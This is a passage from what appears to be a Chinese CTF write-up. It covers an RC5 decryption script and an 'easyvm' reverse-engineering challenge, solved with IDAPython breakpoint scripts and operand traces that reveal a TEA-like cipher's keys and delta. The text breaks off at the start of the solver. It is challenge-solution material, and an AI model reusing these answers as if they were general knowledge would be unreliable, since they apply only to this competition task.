</span></span><span class=line><span class=cl>        <span class=c1># 处理填充（示例使用PKCS#7）</span>
</span></span><span class=line><span class=cl>        <span class=n>blocks</span> <span class=o>=</span> <span class=p>[</span><span class=n>ciphertext</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span> <span class=o>+</span> <span class=mi>8</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>),</span> <span class=mi>8</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>        <span class=n>plaintext</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>block</span> <span class=ow>in</span> <span class=n>blocks</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>plaintext</span> <span class=o>+=</span> <span class=bp>self</span><span class=o>.</span><span class=n>decrypt_block</span><span class=p>(</span><span class=n>block</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>plaintext</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;cleWtemoH3Lo!FTC&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>rc5</span> <span class=o>=</span> <span class=n>RC5</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plainttext</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;flag</span><span class=si>{11111222222333333333333334}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>rc5</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>plainttext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>ciphertext</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0xBB</span><span class=p>,</span> <span class=mh>0xA1</span><span class=p>,</span> <span class=mh>0xF2</span><span class=p>,</span> <span class=mh>0xE9</span><span class=p>,</span> <span class=mh>0x7C</span><span class=p>,</span> <span class=mh>0x87</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x8A</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0xFD</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x94</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x81</span><span class=p>,</span> <span class=mh>0xBC</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x1E</span><span class=p>,</span> <span class=mh>0xE3</span><span class=p>,</span> <span class=mh>0xAA</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0xD8</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0xB8</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x8B</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>plaintext</span> <span class=o>=</span> <span class=n>rc5</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Decrypted: </span><span class=si>{</span><span class=n>plaintext</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=easyvm>easyvm</h2><p>调试可以发现是类tea加密，8字节一组变化</p><p>最开始做复杂了一点点去分析VM里每个指令的作用并试图模拟，最后才想到直接ida下条件断点在重要运算指令上即可，把两个操作数打印下就知道每一步计算都做了什么</p><p>找到vm计算指令的位置（tea中主要为add、sub、xor、shl、shr），简单写下idapython脚本，以此来模拟trace获得加密log</p><p><img src=https://su-team.cn/img/2025-L3HCTF/bb28e8da-4dc7-47cf-8b32-8592c4b3a480.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>idc</span><span class=o>,</span> <span class=nn>idaapi</span>
</span></span><span class=line><span class=cl><span class=n>op1_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;EDX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>op2_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;ECX&#34;</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl><span class=n>result_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;EDX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;shl </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>op1_val</span><span class=p>)</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>op2_val</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>((</span><span class=n>op1_val</span><span class=o>&lt;&lt;</span><span class=n>op2_val</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>idc</span><span class=o>,</span> <span class=nn>idaapi</span>
</span></span><span class=line><span class=cl><span class=n>op1_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;EDX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>op2_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;ECX&#34;</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;shr </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>op1_val</span><span class=p>)</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>op2_val</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>((</span><span class=n>op1_val</span><span class=o>&gt;&gt;</span><span class=n>op2_val</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>idc</span><span class=o>,</span> <span class=nn>idaapi</span>
</span></span><span class=line><span class=cl><span class=n>op1_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;EAX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rbp_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;RBP&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mem_addr</span> <span class=o>=</span> <span class=n>rbp_val</span> <span class=o>+</span> <span class=mh>0x4C</span>
</span></span><span class=line><span class=cl><span class=n>op2_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_wide_dword</span><span class=p>(</span><span class=n>mem_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;xor </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>op1_val</span><span class=p>)</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>op2_val</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>((</span><span class=n>op1_val</span><span class=o>^</span><span class=n>op2_val</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>idc</span><span class=o>,</span> <span class=nn>idaapi</span>
</span></span><span class=line><span class=cl><span class=n>op1_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;EAX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rbp_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;RBP&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mem_addr</span> <span class=o>=</span> <span class=n>rbp_val</span> <span class=o>+</span> <span class=mh>0x1C</span>
</span></span><span class=line><span class=cl><span class=n>op2_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_wide_dword</span><span class=p>(</span><span class=n>mem_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;sub </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>op1_val</span><span class=p>)</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>op2_val</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>((</span><span class=n>op1_val</span><span class=o>-</span><span class=n>op2_val</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>idc</span><span class=o>,</span> <span class=nn>idaapi</span>
</span></span><span class=line><span class=cl><span class=n>op1_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;EAX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>op2_val</span> <span class=o>=</span> <span class=n>idc</span><span class=o>.</span><span class=n>get_reg_value</span><span class=p>(</span><span class=s2>&#34;EDX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;add </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>op1_val</span><span class=p>)</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>op2_val</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>((</span><span class=n>op1_val</span><span class=o>+</span><span class=n>op2_val</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>  
</span></span></code></pre></td></tr></table></div></div><p>log取一轮加密来分析</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=n>shl</span><span class=w> </span><span class=mi>0</span><span class=n>x32323232</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x91919190</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>xa56babcd</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x91919190</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x36fd3d5d</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x32323232</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x32323232</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x32323232</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x32323232</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>xor</span><span class=w> </span><span class=mi>0</span><span class=n>x32323232</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x36fd3d5d</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x4cf0f6f</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>shr</span><span class=w> </span><span class=mi>0</span><span class=n>x32323232</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x3232323</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>xffffffff</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x3232323</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x3232322</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>xor</span><span class=w> </span><span class=mi>0</span><span class=n>x4cf0f6f</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x3232322</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x7ec2c4d</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x31313131</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x7ec2c4d</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x391d5d7e</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x11223344</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x0</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x11223344</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>shl</span><span class=w> </span><span class=mi>0</span><span class=n>x391d5d7e</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xe47575f8</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>xffffffff</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xe47575f8</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xe47575f7</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x11223344</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x391d5d7e</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x4a3f90c2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>xabcdef01</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x4a3f90c2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xf60d7fc3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>xor</span><span class=w> </span><span class=mi>0</span><span class=n>xf60d7fc3</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xe47575f7</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x12780a34</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>shr</span><span class=w> </span><span class=mi>0</span><span class=n>x391d5d7e</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x1c8eaeb</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>xa56babcd</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x1c8eaeb</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xa73496b8</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>xor</span><span class=w> </span><span class=mi>0</span><span class=n>x12780a34</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xa73496b8</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xb54c9c8c</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x32323232</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xb54c9c8c</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xe77ecebe</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sub</span><span class=w> </span><span class=mi>0</span><span class=n>x40</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x3f</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>可以看到三个密钥0xa56babcd、0xffffffff、0xabcdef01以及delta=0x11223344</p><p>往后分析看所有轮加密完total做了什么，可以发现下一组加密8字节用的total值是上一组结束后的total值</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x11223344</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x488cd100</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x59af0444</span><span class=w>    </span><span class=o>//</span><span class=w> </span><span class=err>上一组</span><span class=n>total</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>shl</span><span class=w> </span><span class=mi>0</span><span class=n>x6bc23e4e</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xaf08f938</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>xffffffff</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xaf08f938</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xaf08f937</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x59af0444</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x6bc23e4e</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xc5714292</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>xabcdef01</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xc5714292</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x713f3193</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>xor</span><span class=w> </span><span class=mi>0</span><span class=n>x713f3193</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xaf08f937</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xde37c8a4</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>shr</span><span class=w> </span><span class=mi>0</span><span class=n>x6bc23e4e</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x35e11f2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>xa56babcd</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x35e11f2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xa8c9bdbf</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>xor</span><span class=w> </span><span class=mi>0</span><span class=n>xde37c8a4</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xa8c9bdbf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x76fe751b</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x34343434</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x76fe751b</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xab32a94f</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sub</span><span class=w> </span><span class=mi>0</span><span class=n>x40</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x3f</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>shl</span><span class=w> </span><span class=mi>0</span><span class=n>xab32a94f</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x59954a78</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>xa56babcd</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x59954a78</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xff00f645</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x59af0444</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xab32a94f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x4e1ad93</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x4e1ad93</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x4e1ad93</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>xor</span><span class=w> </span><span class=mi>0</span><span class=n>x4e1ad93</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xff00f645</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xfbe15bd6</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>shr</span><span class=w> </span><span class=mi>0</span><span class=n>xab32a94f</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xab32a94</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>xffffffff</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xab32a94</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xab32a93</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>xor</span><span class=w> </span><span class=mi>0</span><span class=n>xfbe15bd6</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xab32a93</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>xf1527145</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x6bc23e4e</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>xf1527145</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x5d14af93</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>add</span><span class=w> </span><span class=mi>0</span><span class=n>x11223344</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x59af0444</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=n>x6ad13788</span><span class=w>    </span><span class=o>//</span><span class=w> </span><span class=err>新一组</span><span class=n>total</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>搞懂加密逻辑直接开逆</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>c_uint32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tea_encrypt</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>v</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>delta</span><span class=p>):</span>
